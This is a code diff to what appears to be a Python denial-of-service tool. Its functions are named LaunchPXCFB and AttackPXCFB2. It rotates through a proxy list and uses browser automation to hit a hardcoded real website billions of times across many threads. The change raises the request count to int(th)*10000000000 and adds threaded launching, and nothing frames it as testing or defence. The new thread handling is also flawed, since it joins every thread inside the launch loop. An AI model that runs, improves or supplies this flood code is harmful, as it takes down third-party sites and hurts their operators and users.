@@ -580,13 +580,19 @@ def LaunchPXCFB(url, th, t):
 
     })
     proxies = open("./proxy.txt", 'r').read().split('\n')
+    threads = []
 
     if isinstance(proxies, list) and proxies:
 
         for i in range(int(th)):
             try:
                 AttackPXCFB2(url, until, scraper,proxies,th)
-                
+                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxies,th))
+                thd.start()
+                threads.append(thd)
+                # Wait for all threads to complete
+                for thd in threads:
+                    thd.join()
 
             except:
                 print('teo--------------',proxy)
@@ -597,7 +603,8 @@ def LaunchPXCFB(url, th, t):
 
 def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
         proxy = random.choice(proxies).strip().split(":")
-    
+        driver = None
+
         try:
                
                 # Proxy configuration
@@ -624,25 +631,23 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
 
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
-                for _ in range(int(th)*1):
-                    thd = threading.Thread(target=AttackLoop, args=(driver,url))
-                    thd.start()
+                for _ in range(int(th)*10000000000):
+                    driver.get(url)
+                    # Get the page title
+                    page_title = driver.title
+                    print(page_title, '------', proxy)
                     
                     # print(page_source,'------',proxy)
                 # Close the driver
-                driver.quit()
 
 
         except Exception as e:
             print('falid--------------',proxy,e)
-            
+        finally:
+            if driver:
+                driver.quit()    
             pass
-def AttackLoop(driver,url):
-    for _ in range(1):
-        driver.get(url)
-        # Get the page source
-        page_source = driver.title
-        print(page_source)
+
 
 #region CFPRO
 def LaunchCFPRO(url, th, t):
